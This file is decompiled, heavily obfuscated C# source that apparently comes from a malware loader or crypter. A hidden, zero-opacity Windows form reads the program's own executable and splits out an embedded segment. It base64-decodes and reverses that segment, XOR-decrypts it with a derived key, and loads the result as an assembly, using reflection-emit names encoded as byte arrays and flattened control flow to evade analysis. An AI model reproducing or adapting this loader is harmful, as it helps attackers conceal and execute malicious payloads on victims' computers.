using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using _0845bb7b36fe;

namespace fbab6880a695;

public class ImageFactory : Form
{
	[AccessedThroughProperty("Button1")]
	private Button nextCaption;

	private static string[] nextCaption;

	public static string nextCaption;

	private virtual Button BatchBuildXmlFile
	{
		get
		{
			return this.nextCaption;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = RebuildSolution;
			if (this.nextCaption != null)
			{
				goto IL_0025;
			}
			goto IL_0091;
			IL_0091:
			this.nextCaption = value;
			int num;
			int num2;
			if (this.nextCaption == null)
			{
				num = 68764026;
				num2 = 68764026;
			}
			else
			{
				num = 1607465281;
				num2 = 1607465281;
			}
			goto IL_0060;
			IL_0060:
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num ^ 0x6684AAFDu) % 5u)
				{
				case 4u:
					break;
				case 3u:
					((Control)this.nextCaption).add_Click(eventHandler);
					num = ((int)num3 * -1335694983) ^ -170791258;
					continue;
				case 2u:
					((Control)this.nextCaption).remove_Click(eventHandler);
					num = ((int)num3 * -425572686) ^ 0x5D2AF518;
					continue;
				default:
					return;
				case 1u:
					goto IL_0091;
				case 0u:
					return;
				}
				break;
			}
			goto IL_0025;
			IL_0025:
			num = 143536925;
			goto IL_0060;
		}
	}

	static ImageFactory()
	{
		string[] array = new string[13]
		{
			Encoding.Default.GetString(new byte[12]
			{
				55, 101, 54, 53, 56, 97, 102, 55, 54, 101,
				53, 97
			}),
			null,
			null,
			null,
			null,
			null,
			null,
			null,
			null,
			null,
			null,
			null,
			null
		};
		while (true)
		{
			int num = -1057993764;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xE6880E52u) % 12u)
				{
				case 11u:
					array[2] = Encoding.Default.GetString(new byte[4] { 76, 111, 97, 100 });
					array[3] = Encoding.Default.GetString(new byte[36]
					{
						83, 121, 115, 116, 101, 109, 46, 82, 101, 102,
						108, 101, 99, 116, 105, 111, 110, 46, 69, 109,
						105, 116, 46, 68, 121, 110, 97, 109, 105, 99,
						77, 101, 116, 104, 111, 100
					});
					num = (int)(num2 * 1530759294) ^ -335217292;
					continue;
				case 10u:
					array[9] = Encoding.Default.GetString(new byte[16]
					{
						83, 121, 115, 116, 101, 109, 46, 65, 112, 112,
						68, 111, 109, 97, 105, 110
					});
					array[10] = Encoding.Default.GetString(new byte[7] { 76, 100, 97, 114, 103, 95, 48 });
					num = (int)((num2 * 1898768781) ^ 0x694101E6);
					continue;
				case 7u:
					array[6] = Encoding.Default.GetString(new byte[4] { 69, 109, 105, 116 });
					num = ((int)num2 * -1719716962) ^ 0x201D1289;
					continue;
				case 6u:
					array[1] = Encoding.Default.GetString(new byte[17]
					{
						103, 101, 116, 95, 67, 117, 114, 114, 101, 110,
						116, 68, 111, 109, 97, 105, 110
					});
					num = ((int)num2 * -389337017) ^ -897129293;
					continue;
				case 5u:
					array[7] = Encoding.Default.GetString(new byte[30]
					{
						83, 121, 115, 116, 101, 109, 46, 82, 101, 102,
						108, 101, 99, 116, 105, 111, 110, 46, 69, 109,
						105, 116, 46, 79, 112, 67, 111, 100, 101, 115
					});
					array[8] = Encoding.Default.GetString(new byte[4] { 67, 97, 108, 108 });
					num = (int)((num2 * 409341963) ^ 0x48F685F7);
					continue;
				case 4u:
					array[12] = Encoding.Default.GetString(new byte[3] { 82, 101, 116 });
					num = (int)((num2 * 777856315) ^ 0x2E915A6D);
					continue;
				case 3u:
					ImageFactory.nextCaption = array;
					num = (int)(num2 * 1568926633) ^ -1976598500;
					continue;
				case 2u:
					array[11] = Encoding.Default.GetString(new byte[8] { 67, 97, 108, 108, 118, 105, 114, 116 });
					num = ((int)num2 * -1025730151) ^ -1102373040;
					continue;
				case 1u:
					nextCaption = null;
					num = (int)(num2 * 962801509) ^ -1330810798;
					continue;
				case 0u:
					array[4] = Encoding.Default.GetString(new byte[26]
					{
						83, 121, 115, 116, 101, 109, 46, 82, 101, 102,
						108, 101, 99, 116, 105, 111, 110, 46, 65, 115,
						115, 101, 109, 98, 108, 121
					});
					array[5] = Encoding.Default.GetString(new byte[14]
					{
						71, 101, 116, 73, 76, 71, 101, 110, 101, 114,
						97, 116, 111, 114
					});
					num = (int)((num2 * 588761566) ^ 0x5866280D);
					continue;
				default:
					return;
				case 8u:
					break;
				case 9u:
					return;
				}
				break;
			}
		}
	}

	public ImageFactory()
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)GenerateDevice);
		BatchBuildXmlFile = new Button();
		AppDomain.CurrentDomain.AssemblyResolve += GenerateDevice;
		Application.EnableVisualStyles();
		((Form)this).set_Text(PathSet.nextCaption[0]);
		((ButtonBase)BatchBuildXmlFile).set_Text(PathSet.nextCaption[1]);
		((Control)BatchBuildXmlFile).set_Top(100);
		((Control)BatchBuildXmlFile).set_Left(100);
		((Control)this).get_Controls().Add((Control)(object)BatchBuildXmlFile);
		((Control)this).Hide();
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		nextCaption = Assembly.GetExecutingAssembly().Location;
	}

	private void GenerateDevice(object sender, EventArgs e)
	{
		AppDomain.CurrentDomain.SetData(PathSet.nextCaption[2], ComponentAttribute.nextCaption);
		AppDomain.CurrentDomain.SetData(PathSet.nextCaption[3], nextCaption);
		while (true)
		{
			int num = -1174507167;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xD5DC63F8u) % 3u)
				{
				case 1u:
					goto IL_0033;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
				IL_0033:
				_fa6e539b1f72._7d19330e3a84();
				num = ((int)num2 * -1637166667) ^ -1449561481;
			}
		}
	}

	private Assembly GenerateDevice(object nextCaption, ResolveEventArgs parentLog)
	{
		Assembly result = default(Assembly);
		if (parentLog.Name.Contains(PathSet.nextCaption[4]))
		{
			while (true)
			{
				int num = -1968043365;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x91504756u) % 4u)
					{
					case 1u:
					{
						int num3;
						int num4;
						if (parentLog.Name.Contains(PathSet.nextCaption[5]))
						{
							num3 = 567457527;
							num4 = 567457527;
						}
						else
						{
							num3 = 1652221493;
							num4 = 1652221493;
						}
						num = num3 ^ (int)(num2 * 843491943);
						continue;
					}
					case 0u:
						result = AppDomain.CurrentDomain.Load(GenerateDevice(ImageFactory.nextCaption));
						num = (int)((num2 * 837778300) ^ 0x5282822C);
						continue;
					case 3u:
						break;
					default:
						goto end_IL_0092;
					}
					break;
				}
				continue;
				end_IL_0092:
				break;
			}
		}
		return result;
	}

	public byte[] GenerateDevice(string nextCaption)
	{
		byte[] array = RebuildSolution(Strings.StrReverse(GenerateDevice(nextCaption, 1)));
		byte[] array2 = null;
		try
		{
			array2 = RebuildSolution(GenerateDevice(nextCaption, 2));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		byte[] array3 = null;
		int num6 = default(int);
		byte[] array4 = default(byte[]);
		int num7 = default(int);
		byte[] array5 = default(byte[]);
		byte[] bytes = default(byte[]);
		int num10 = default(int);
		int num12 = default(int);
		int num9 = default(int);
		byte[] array6 = default(byte[]);
		byte b = default(byte);
		int num3 = default(int);
		byte[] result = default(byte[]);
		int num4 = default(int);
		while (true)
		{
			int num = -563961121;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8E622434u) % 23u)
				{
				case 22u:
					num6 = checked(array4.Length - 1);
					num7 = 0;
					num = (int)((num2 * 603857439) ^ 0x711E82A3);
					continue;
				case 21u:
					num = (int)(num2 * 1720392416) ^ -546651702;
					continue;
				case 20u:
					num = (int)((num2 * 403398554) ^ 0x2D3FEF28);
					continue;
				case 19u:
					array5[0] = (byte)(array5[0] ^ bytes[num10]);
					num12 = checked(array5.Length - 1);
					num9 = 1;
					num = -1002558123;
					continue;
				case 18u:
					array3 = array4;
					num = (int)((num2 * 451858641) ^ 0x48984577);
					continue;
				case 17u:
					array6 = array5;
					array4 = array;
					b = array[checked(array.Length - 1)];
					num = ((int)num2 * -559275140) ^ 0x37FB624F;
					continue;
				case 15u:
				{
					num10 = checked(num10 + 1);
					int num14;
					int num15;
					if (num10 <= 1)
					{
						num14 = -1662904641;
						num15 = -1662904641;
					}
					else
					{
						num14 = -1541378834;
						num15 = -1541378834;
					}
					num = num14 ^ ((int)num2 * -309779687);
					continue;
				}
				case 14u:
					bytes = BitConverter.GetBytes(Math.Round(Math.PI, 3));
					num = (int)((num2 * 496360288) ^ 0x3644590E);
					continue;
				case 13u:
					array4[num7] = (byte)(array4[num7] ^ b ^ array6[num7]);
					num = -397764729;
					continue;
				case 12u:
					num7 = checked(num7 + 1);
					num = (int)((num2 * 334300903) ^ 0x4BB1E397);
					continue;
				case 11u:
					num3 = checked(num3 + 1);
					num = ((int)num2 * -581839274) ^ -1257512860;
					continue;
				case 10u:
					num10 = 0;
					num = ((int)num2 * -1530518120) ^ -31061690;
					continue;
				case 9u:
					array5 = new byte[checked(array.Length - 1 + 1)];
					Buffer.BlockCopy(array2, 0, array5, 0, array2.Length);
					num = ((int)num2 * -1284961685) ^ 0xB729663;
					continue;
				case 8u:
					Array.Resize(ref array4, checked(array4.Length - 1));
					num = (int)((num2 * 1410825326) ^ 0x6F93FDFC);
					continue;
				case 7u:
					checked
					{
						array5[num3] = (byte)unchecked((array2[checked(num3 - array2.Length) % array2.Length] ^ array5[checked(num3 - 1)]) % 256);
						num = -199042095;
						continue;
					}
				case 6u:
				{
					int num13;
					if (num9 <= num12)
					{
						num = -1876066767;
						num13 = -1876066767;
					}
					else
					{
						num = -1003766843;
						num13 = -1003766843;
					}
					continue;
				}
				case 5u:
					result = array3;
					num = (int)(num2 * 172236156) ^ -2104816861;
					continue;
				case 3u:
				{
					int num11 = array2.Length;
					num4 = checked(array.Length - 1);
					num3 = num11;
					num = (int)((num2 * 421681931) ^ 0x4EE0A331);
					continue;
				}
				case 2u:
					checked
					{
						array5[num9] = (byte)unchecked((array5[num9] ^ (byte)(bytes[num10] << ((num9 % 4) & 7)) ^ array5[checked(num9 - 1)]) % 256);
						num9++;
						num = -1002558123;
						continue;
					}
				case 1u:
				{
					int num8;
					if (num7 > num6)
					{
						num = -2088414945;
						num8 = -2088414945;
					}
					else
					{
						num = -1030848018;
						num8 = -1030848018;
					}
					continue;
				}
				case 0u:
				{
					int num5;
					if (num3 <= num4)
					{
						num = -693401627;
						num5 = -693401627;
					}
					else
					{
						num = -286024242;
						num5 = -286024242;
					}
					continue;
				}
				case 4u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public string GenerateDevice(string nextCaption, int parentLog)
	{
		StreamReader streamReader = new StreamReader(nextCaption);
		try
		{
			string result = Regex.Split(streamReader.ReadToEnd(), ImageFactory.nextCaption[0])[parentLog];
			uint num = 1309992491u;
			return result;
		}
		finally
		{
			if (streamReader != null)
			{
				while (true)
				{
					IL_0059:
					int num2 = -2040837697;
					while (true)
					{
						uint num;
						switch ((num = (uint)num2 ^ 0x82668F74u) % 3u)
						{
						case 1u:
							goto IL_0029;
						default:
							goto end_IL_003c;
						case 2u:
							break;
						case 0u:
							goto end_IL_003c;
						}
						goto IL_0059;
						IL_0029:
						((IDisposable)streamReader).Dispose();
						num2 = ((int)num * -464575026) ^ -78129807;
						continue;
						end_IL_003c:
						break;
					}
					break;
				}
			}
		}
	}

	public byte[] RebuildSolution(string nextCaption)
	{
		return Convert.FromBase64String(nextCaption);
	}

	private void RebuildSolution(object sender, EventArgs e)
	{
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		Interaction.MsgBox((object)PathSet.nextCaption[6], (MsgBoxStyle)0, (object)null);
	}
}
